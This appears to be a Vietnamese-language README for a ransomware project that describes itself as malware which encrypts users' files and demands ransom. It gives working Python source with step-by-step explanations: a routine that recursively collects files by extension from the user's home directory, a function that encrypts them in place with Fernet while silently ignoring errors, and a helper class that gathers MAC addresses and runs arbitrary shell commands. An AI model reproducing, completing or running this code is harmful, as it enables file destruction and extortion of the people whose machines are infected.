# RANSOMWARE
Chương trình ransomware, một loại phần mềm độc hại thường sử dụng để mã hóa các tệp trên máy tính của người dùng và yêu cầu một khoản tiền chuộc để giải mã chúng.

## MODULES
**1.CRYPTO**
```python
def Process_Files(Private: Fernet, mode: str):
    for _, files in List_Files().items():
        for file in files:
            temp_file = file + '.temp'
            try:
                with open(file, 'rb') as original_file, open(temp_file, 'wb', buffering=4096*1024) as temp_file:
                    with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        offset = 0
                        while offset < len(mm):
                            chunk = mm[offset:offset + 4096 * 1024]
                            if not chunk:
                                break
                            processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
                            temp_file.write(processed_chunk)
                            offset += len(chunk)
                shutil.move(temp_file.name, file)
            except Exception as e: pass
            finally:
                if os.path.exists(temp_file.name):
                    os.remove(temp_file.name)
```
1. Hàm *Process_Files* nhận vào hai tham số: *Private*, một đối tượng *Fernet* được sử dụng để mã hóa và giải mã, và *mode*, một chuỗi chỉ định chế độ hoạt động (‘encrypt’ hoặc ‘decrypt’).

2. Hàm này sẽ duyệt qua tất cả các tệp tin được trả về bởi hàm *List_Files*.

3. Đối với mỗi tệp, nó tạo một tệp tạm thời với tên là tên tệp gốc kèm theo ‘.temp’.

4. Nó mở tệp gốc để đọc và tệp tạm thời để ghi, với kích thước bộ đệm là 4096*1024 byte. Sử dụng mmap để ánh xạ tệp gốc vào bộ nhớ. 
Sau đó đọc và xử lý từng ‘chunk’ của tệp gốc, với kích thước ‘chunk’ là 4096*1024 byte.

5. Mỗi ‘chunk’ sau đó được mã hóa (nếu mode là ‘encrypt’) hoặc giải mã (nếu mode là ‘decrypt’) bằng cách sử dụng đối tượng Fernet, và sau đó được ghi vào tệp tạm thời.

6. Khi tất cả các ‘chunk’ đã được xử lý, tệp tạm thời được đổi tên thành tên của tệp gốc, thay thế tệp gốc. Nếu có lỗi xảy ra trong quá trình này, hàm sẽ bỏ qua lỗi và tiếp tục với tệp tiếp theo. Cuối cùng, nếu tệp tạm thời vẫn tồn tại (ví dụ, do một lỗi xảy ra), nó sẽ được xóa.
```python
def List_Files() -> dict:
    with open('scripts/extensions.yaml', 'r') as file:
        exts = Safe_Load(file)

    file_categories = {category: [] for category in exts}
    extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

    for entry in Path.home().rglob('*'):
        if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
            file_categories[extcategory[ext]].append(str(entry))

    return file_categories
```
1. Hàm mở tệp *‘scripts/extensions.yaml’* để đọc và sử dụng hàm *Safe_Load(file)* để phân tích dữ liệu *YAML* từ tệp này. Kết quả được lưu vào biến *exts*.

2. Tạo một từ điển *file_categories* với các khóa là các danh mục từ *exts* và giá trị là các danh sách trống. Tạo một từ điển *extcategory* mà mỗi phần mở rộng tệp trong *exts* là một khóa và giá trị tương ứng là danh mục của phần mở rộng đó.

3. Sau đó duyệt qua tất cả các tệp trong thư mục chính của người dùng. Nếu một mục là tệp và phần mở rộng của nó (được chuyển thành chữ thường) có trong *extcategory*, tệp đó sẽ được thêm vào danh mục tương ứng trong *file_categories*.

**2.SYSTEM**
```python
class System:
    def __init__(self) -> None:
        self.Windows = _os_name == 'nt'
 
    def Init(self) -> None:
        _system('')

    def Clear(self) -> None:
        return _system("cls" if self.Windows else "clear")

    def Title(self, title: str):
        if self.Windows:
            return _system(f"title {title}")

    def Size(self, x: int, y: int) -> None:
        if self.Windows:
            return _system(f"mode {x}, {y}")
    
    def Reset(self) -> None:
        execv(executable, [executable] + argv) 
    
    def Mac(self) -> str:
        try:
            address_mac = [
                address.address 
                for addresses in net_if_addrs().values() 
                for address in addresses 
                if address.family == AF_LINK
            ]
            return '|'.join(address_mac) if address_mac else 'nm'  
        except:
            return 'nm'
    
    def Command(command: str):
        return _system(command)
```
    1 variable:
        Windows    |      cho biết người dùng đang sử dụng hệ điều hành Windows hay không
    7 functions:
        Init()     |      khởi tạo terminal để cho phép sử dụng màu sắc
        Clear()    |      xóa terminal
        Title()    |      đặt tiêu đề của terminal, chỉ dành cho Windows
        Size()     |      đặt kích thước của terminal, chỉ dành cho Windows
        Reset()    |      khởi động lại chương trình hiện tại
        Mac()      |      địa chỉ MAC của máy tính
        Command()  |      thực thi một lệnh shell trên hệ thống máy tính
```python
def Console(ip: str, msg: str, color: str) -> None:
    color_code = getattr(Col, color)
    # Hàm getattr được sử dụng để lấy giá trị thuộc tính color từ đối tượng Col.
    message = f" [{Col.Green}{ip}{Col.White}] --> {color_code}{msg}{Col.White}."
    # Tạo một chuỗi được định dạng
    print(message)
    # In ra chuỗi đã được định dạng
```
## SERVER - CLIENT

Truy cap thu muc test xem nguyen li hoat dong.